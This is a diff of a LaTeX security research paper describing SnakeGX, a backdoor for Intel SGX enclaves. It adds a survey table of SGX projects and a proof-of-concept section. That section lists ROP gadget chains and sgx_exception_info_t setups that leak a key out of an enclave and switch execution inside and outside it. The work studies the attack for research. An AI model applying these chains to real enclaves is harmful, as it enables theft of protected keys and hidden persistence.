@@ -229,22 +229,65 @@ by assuming the host can perform memory forensic analysis.
 Therefore, an adversary has the need of hiding her presence in the machine 
 and minimizing the interactions with the victim enclave.
 
+
+\begin{table}
+	\centering
+	\begin{tabular}{lcc}
+		\toprule
+		\textbf{Category/Project} & \multicolumn{1}{l}{\textbf{Intel SGX SDK}} 
+		& 
+		\multicolumn{1}{l}{\textbf{\# of threads}} \\ \midrule \midrule
+		\multicolumn{3}{l}{\textbf{Blockchain}} \\ \midrule
+		teechain & \checkmark & 10 \\
+		private-data-objects & \checkmark & 10 \\
+		& \checkmark & 1 \\
+		& \checkmark & 2 \\
+		fabric-secure-chaincode & \checkmark & 10 \\
+		& \checkmark & 8 \\
+		eevm & \multicolumn{2}{l}{Open Enclave SDK~\cite{openenclave}} \\
+		lucky & \multicolumn{2}{l}{Based on a mock SGX implementation} \\
+		node-secureworker & \checkmark & 1 \\
+		town-crier & \checkmark & 10 \\
+		& \checkmark & 10 \\
+		& \checkmark & 1 \\
+		& \checkmark & 6 \\
+		bolos-enclave & \checkmark & 1 \\ \midrule
+		\multicolumn{3}{l}{\textbf{Machine Learning Framework}} \\ \midrule
+		gbdt-rs & \checkmark & 1 \\
+		bi-sgx & \checkmark & 1 \\
+		slalom & \checkmark & 4 \\ \midrule
+		\multicolumn{3}{l}{\textbf{Applications}} \\ \midrule
+		sgxwallet & \checkmark & 16 \\
+		sgx-tor & \checkmark & 10 \\
+		& \checkmark & 10 \\
+		obscuro & \checkmark & 50 \\
+		channel-id-enclave & \checkmark & 10 \\
+		sfaas & \checkmark & 3 \\
+		phoenix & \multicolumn{2}{l}{Graphene~\cite{203255}} \\
+		posup & \checkmark & 4 \\
+		tresorsgx & \checkmark & 10 \\ \midrule
+		\multicolumn{3}{l}{\textbf{Private Key/Passphrase Management}} \\ 
+		\midrule
+		sgx-kms & \checkmark & 8 \\
+		keystore & \checkmark & 1 \\
+		safekeeper-server & \checkmark & 10 \\ \midrule
+		\multicolumn{3}{l}{\textbf{Database}} \\ \midrule
+		talos & \checkmark & 50 \\
+		opaque & \checkmark & 10 \\
+		stealthdb & \checkmark & 10 \\
+		sgx\_sqlite & \checkmark & 10 \\
+		shieldstore & \checkmark & 8 \\
+		\bottomrule		
+	\end{tabular}
+	\caption[List of SGX open-source projects.]{SGX open-source projects 
+		extracted from \cite{asop}.}
+	\label{tbl:sgx-open-source-prj}
+\end{table}
+
 \paragraph{Preliminary Analysis of Assumptions.}
-%We collected a set of $27$ stand-alone SGX open-source projects from an online 
-%hub~\cite{asop} to investigate the correctness of our assumptions and shown 
-%in  
-%Table~\ref{tbl:sgx-open-source-prj}.
-%The results show that among the $27$ projects, $24$ of them were based on the 
-%Intel SGX SDK, while others were developed with Graphene~\cite{203255}, Open 
-%Enclave SDK~\cite{openenclave}, or contained mocked enclaves.
-%From the Intel SGX SDK based projects, we counted $31$ enclaves in total, 
-%among which $24$ were multi-threading ($77\%$).
-%This preliminary analysis indicates that our threat model fulfills 
-%real scenarios.
-% OLD
 We collected a set of $27$ stand-alone SGX open-source projects from 
-\cite{asop} to investigate the correctness of our assumptions (see full 
-list in Appendix~\ref{app:preliminary-analysis-assumptions}).
+\cite{asop} to investigate the correctness of our assumptions, see full 
+list in Table~\ref{tbl:sgx-open-source-prj}.
 The results show that among the $27$ projects, $24$ of them were based on the 
 Intel SGX SDK, while others were developed with Graphene~\citep{203255}, Open 
 Enclave SDK~\citep{openenclave}, or contained mocked enclaves.
@@ -934,6 +977,246 @@ Finally, P$_2$ can clean the traces left by O$_c$ and continue the backdoor
 execution.
 It is possible to perform many context-switch by tuning the payload accordingly.
 
+\section{Proof-of-Concept Implementation}
+
+In this section, we discuss the implementation details of our proof-of-concept.
+We first describe the code-reuse technique used 
+(Section~\ref{ssec:my-rop-chain}), then we focus on a the ROP chain used for 
+conditional jumps (Section~\ref{app:condition-gadget}) and the context-switch 
+(Section~\ref{app:context-switch-chain}).
+
+\subsection{Code-Reuse Technique}
+\label{ssec:my-rop-chain}
+%To show the feasibility of SnakeGX, we built our proof-of-concept
+%on top of the research proposed by Biondo et al.~\cite{biondo2018guard}.
+To show the feasibility of SnakeGX, we choose for our proof-of-concept
+the technique described by \cite{biondo2018guard}.
+This means that SnakeGX uses ROP. 
+%\todo{FT: suggestion: "SnakeGX does not rely on a specific technical, but it 
+%does require one to control its behavior."}
+However, as stated in Section~\ref{sec:threat-model}, 
+%SnakeGX does not require any specific code-reuse technique as long as this 
+%allows controlling the enclave behaviour.
+SnakeGX does not rely on a specific technique, but it does require one to 
+control its behavior.
+Moreover, we adapted their approach to work on the Intel SGX SDK newer versions.
+
+In the original approach, the authors exploited \texttt{asm\_oret()} and 
+\texttt{continue\_exec\\ution()} functions.
+%, both described in~\cite{biondo2018guard}. %Section~\ref{ssec:cont}.
+More precisely, they crafted a set of fake frame in order to create a loop 
+between these functions.
+In the x$64$ architecture, the first four function parameters are passed by 
+registers.
+Therefore, the authors used \texttt{asm\_oret()} for setting 
+\texttt{continue\_execution()} registers pointing to a controlled structure.
+However, as also Biondo underlined, it is more complicated to use 
+\texttt{asm\_oret()} for SDK $2.0$.
+This is why in our approach we substituted \texttt{asm\_oret()} with a 
+\emph{glue gadget}.
+This might be any gadget that sets the input register for the 
+\texttt{continue\_execution()} function.
+Since we developed our proof-of-concept for Linux 64bit, 
+\texttt{continue\_execution()} expects the first argument
+(\ie a \texttt{sgx\_exception\_info\_t} address) in the \texttt{rdi} register.
+This is achievable by using a classic \texttt{pop rdi} gadget. 
+Windows, instead, follows a different calling convention
+and \texttt{continue\_execution()} expects an \texttt{ocall\_context} address 
+shifted by $8$ byes in the \texttt{rcx} register.
+Therefore we used a \texttt{pop rcx} as a \emph{glue gadget}.
+In our evaluation, we found \texttt{pop rdi} and \texttt{pop 
+	rcx} gadgets in the Intel SGX SDK version for Linux and Windows, 
+	respectively.
+
+Figure~\ref{fig:flavio-enclave-chain} describes our code-reuse technique.
+The attacker crafts a fake stack that can reside inside or outside the enclave,
+we used both approaches. The fake stack is composed by frames, one of which 
+contains in order:
+\begin{enumerate*}[label=(\roman*)]
+	\item a \emph{glue gadget} address,
+	\item a fake \texttt{sgx\_exception\_info\_t} address,
+	\item the \texttt{continue\_execution()} address.
+\end{enumerate*}
+Once the first \emph{glue gadget} is triggered, it will set \texttt{rdi} (or 
+\texttt{rcx} in Windows) register pointing to the fake 
+\texttt{sgx\_exception\_info\_t} structure.
+Then, the \texttt{continue\_execution()} will set registers according to 
+\texttt{sgx\_exception\_info\_t} 
+and it will also pivot to the actual gadget.
+Since \texttt{continue\_execution()} allows us to control all general registers,
+we can easily invoke another function instead of a simple gadget (\eg 
+\texttt{memcpy} in Frame~$1$).
+Finally, the gadget will return at the beginning of the next frame.
+At this point, the CPU will trigger a new \emph{glue gadget} and the attack 
+continues.
+
+Our technique is more flexible compared to the one described by Biondo.
+By using a \emph{glue gadget}, we can easily drive 
+\texttt{continue\_execution()} without
+relying on other SDK functions that might change in future versions.
+
+\begin{figure}[t]
+	\centering
+	\includegraphics[width=0.8\textwidth]{fig_c5/flavio-enclave-chain.pdf}
+	\caption{Chain used in the proof-of-concept of SnakeGX.}
+	\label{fig:flavio-enclave-chain}
+\end{figure}
+
+%\onecolumn
+\subsection{Conditional Chain}
+\label{app:condition-gadget}
+Conditional ROP-chain, the chain is triggered by using 
+\texttt{sgx\_exception\_info\_t} structure that configures the initial	
+registers (see Section~\ref{ssec:my-rop-chain}).
+The \texttt{SP} register is perturbed if the value of 
+\texttt{\&lastKey} differs from the value of \texttt{\&key} in order to 
+pivot a true or a false ROP-chain, respectively.
+%\begin{figure}[h]
+\begin{lstlisting}[style=CStyle,escapechar=@]	
+/// we set the following registers through
+/// a sgx_exception_info_t structure:
+/// rdi = &lastKey; last key exfiltrated
+/// rax = &key; current key loaded
+/// rdx = #offset; to pivot to the false ROP-chain
+/// rcx = &true-chain; address of the true ROP-chain
+mov eax, dword ptr [rax] ; ret
+mov rdi, qword ptr [rdi + 0x68] ; ret
+cmp eax, edi ; sete al ; movzx eax, al ; ret
+neg eax ; ret
+and eax, edx ; ret
+add rax, rcx ; ret
+xchg rax, rsp ; ret
+// 0x80 nops for padding
+// beginning of true ROP-chain
+pop rdi ; ret
+// context to pivot to the ROP-chain that implements the true branch
+&context_true
+// address of continue_execution function
+&continue_execution
+// beginning of false ROP-chain
+pop rdi ; ret 
+// context to pivot to the ROP-chain that implements the false branch
+&context_false
+// address of continue_execution function
+&continue_execution\end{lstlisting}
+%	\caption{Conditional ROP-chain, the chain is triggered by using 
+%		\texttt{sgx\_exception\_info\_t} structure that configures the initial	
+%		registers (see Appendix~\ref{ssec:my-rop-chain}).
+%		The \texttt{SP} register is perturbed if the value of 
+%		\texttt{\&lastKey} differs from the value of \texttt{\&key} in order to 
+%		pivot a true or a false ROP-chain, respectively.}
+%	\label{fig:condition-chain}
+%\end{figure}
+
+%\begin{figure}[h]
+%	\begin{lstlisting}[style=CStyle,escapechar=@]	
+%/// we set the following registers through a sgx_exception_info_t structure:
+%// rcx = &ctn // address of counter for internal status
+%// rsi = 0
+%// rdx = #offset // to pivot to the false ROP-chain
+%// r10 = &true-chain // address of the true ROP-chain
+%// rdi = 10 // number of elements to check
+%mov eax, dword ptr [rcx] ; ret
+%sub eax, edi ; ret
+%neg eax ; ret
+%adc esi, esi ; ret
+%xor eax, eax ; ret // it avoids the side effect of the following gadget
+%mov eax, esi ; mov rcx, rdi ; jne 0x70d8 ; ret
+%neg eax ; ret
+%and eax, edx ; ret
+%add rax, r10 ; ret
+%xchg rax, rsp ; ret 0x80
+%// 0x80 nops for padding
+%// beginning of true ROP-chain
+%pop rdi ; ret 
+%&context_true // context to pivot to the ROP-chain
+%							// that implements the true branch
+%&continue_execution // address of continue_execution function
+%// beginning of false ROP-chain
+%pop rdi ; ret 
+%&context_false  // context to pivot to the ROP-chain 
+%			 					// that implements the false branch
+%&continue_execution // address of continue_execution function\end{lstlisting}
+%	\caption{Condition ROP-chain, the chain is triggered by 
+%	using 
+%	\texttt{sgx\_exception\_info\_t} structure that configures the registers 
+%	(see Appendix~\ref{ssec:my-rop-chain}).
+%	The \texttt{SP} register is perturbed according to the value stored in 
+%	\texttt{\&ctn} in order to pivot to a true or a false ROP-chain, 
+%	respectively.}
+%	\label{fig:condition-chain}
+%\end{figure}
+
+\subsection{Context-Switch Chain}
+\label{app:context-switch-chain}
+Details of the \texttt{sgx\_exception\_info\_t} 
+structures used to leak the key and to switch outside the enclave.
+The structures are used according to the techniques described in 
+Section~\ref{ssec:my-rop-chain}.
+%\begin{figure}[h]
+\begin{lstlisting}[style=CStyle,escapechar=@]
+/* ...previous sgx_exception_info_t structures... */
+// leaks the key outside the enclave
+// memcpy(key, buff)
+ctxPc[2].cpu_context.rsi = &key; // address of the key
+ctxPc[2].cpu_context.rdi = &buff; // memory regions where leaking the key
+ctxPc[2].cpu_context.rdx = KEY_LENGTH; // length of the key
+ctxPc[2].cpu_context.rip = &memcpy;
+// prepares the next boot chain in the workspace
+// memcpy(boot_chain, workspace)
+ctxPc[3].cpu_context.rdi = &workspace; // workspace address
+ctxPc[3].cpu_context.rdx = sizeof(boot_chain);
+ctxPc[3].cpu_context.rsi = &boot_chain_backup;
+ctxPc[3].cpu_context.rip = &memcpy;
+// set the fake OCALL frame in the enclave
+// memcpy(fake_frame, enclave)
+ctxPc[4].cpu_context.rdi = &fake_frame;
+ctxPc[4].cpu_context.rdx = sizeof(fake_frame);
+ctxPc[4].cpu_context.rsi = &fake_frame_backup;
+ctxPc[4].cpu_context.rip = &memcpy;
+// saves CPU extended states for asm_oret
+// save_xregs(xsave_buffer)
+ctxPc[5].cpu_context.rdi = &xsave_buffer;
+ctxPc[5].cpu_context.rip = &save_xregs;
+// sets the trusted thread as it is performing an OCALL
+// update_ocall_lastsp(fake_frame)
+ctxPc[6].cpu_context.rdi = fake_frame;
+ctxPc[6].cpu_context.rip = &update_ocall_lastsp;
+// pivots to the outside-chain
+// eenclu[exit] -> outside_chain
+ctxPc[7].cpu_context.rax = 0x4; // EEXIT
+ctxPc[7].cpu_context.rsp = &outside_chain_stack;
+ctxPc[7].cpu_context.rbx = &outside_chain_first_gadget;
+ctxPc[7].cpu_context.rip = &enclu;\end{lstlisting}
+%\caption{Details of the \texttt{sgx\_exception\_info\_t} 
+%structures used to leak the key and to switch outside the enclave.
+%The structures are used according to the techniques described in 
+%Appendix~\ref{ssec:my-rop-chain}.}
+%\label{fig:context-switch-trusted-chain}
+%\end{figure}
+
+Details of the outside ROP-chains used to resume 
+payload inside the enclave.
+%\begin{figure}[h]
+\begin{lstlisting}[style=CStyle,escapechar=@]
+/* ...previous gadgets for shipping the password remotely... */
+// gadgets to resume payload within the enclave
+pop rax ; ret
+0x2 // EENTER
+pop rbx ; ret
+&tcs_address
+pop rdi ; ret // rdi = -2 -> ORET
+0xfffffffffffffffe // -2
+pop rcx ; ret // for async exit handler
+&Lasync_exit_pointer
+&enclu_urts\end{lstlisting}
+%	\caption{Details of the outside ROP-chains used to resume 
+%	payload inside 
+%	the enclave.}
+%	\label{fig:colntext-switch-outside-chain}
+%\end{figure}
+
+
 \section{Evaluation}
 \label{sec:evaluation_snakegx}
 
@@ -982,7 +1265,7 @@ and activates complex logic that resides inside a trusted enclave.
 
 In this section, we discuss the properties of 
 our PoC payload and some implementation details. For more technical 
-details about our payload see Appendix~\ref{ssec:my-rop-chain}.
+details about our payload see Section~\ref{ssec:my-rop-chain}.
 Our setup is composed by an application that loads StealthDB enclave 
 and performs the attacks.
 We extracted the gadgets for the \emph{chains} by running ROPGadget on the 
@@ -1061,7 +1344,7 @@ Once the key changes, P$_1$ will pivot to a \emph{chain} that performs the
 exfiltration. Otherwise, the payload will pivot to 
 another \emph{chain} that simply resumes the normal enclave behavior.
 We describe the gadgets used to perform conditional pivoting in 
-Appendix~\ref{app:condition-gadget}.
+Section~\ref{app:condition-gadget}.
 The interaction with the OS, instead, requires two types of \emph{chains}: some 
 that run inside the enclave (\ie P$_1$ and P$_2$), and others that run outside
 (\ie O).
@@ -1078,7 +1361,7 @@ The internal ecosystem of \texttt{tRts}, and the \texttt{libc} in Linux
 systems, provide
 enough gadgets and functions to create useful payloads.
 We describe the gadgets used for these \emph{chains} in 
-Appendix~\ref{app:context-switch-chain}.
+Section~\ref{app:context-switch-chain}.
 
 \begin{table}[t]
 	\centering
@@ -1109,7 +1392,7 @@ These traces can be found by using previous results already shown in the
 literature~\citep{stancill2013check,polychronakis2011rop,kittel2015counteracting,Graziano:2016:RFA:2897845.2897894}.
 Moreover, their identification results even simpler since
 they use peculiar structures such as 
-\texttt{sgx\_exception\_info\_t} (see Appendix~\ref{ssec:my-rop-chain}).
+\texttt{sgx\_exception\_info\_t} (see Section~\ref{ssec:my-rop-chain}).
 On the contrary, SnakeGX requires only one \texttt{ORET} to trigger the
 payload.
 In particular, our PoC implements an \texttt{ORET} by using only $4$ gadgets 
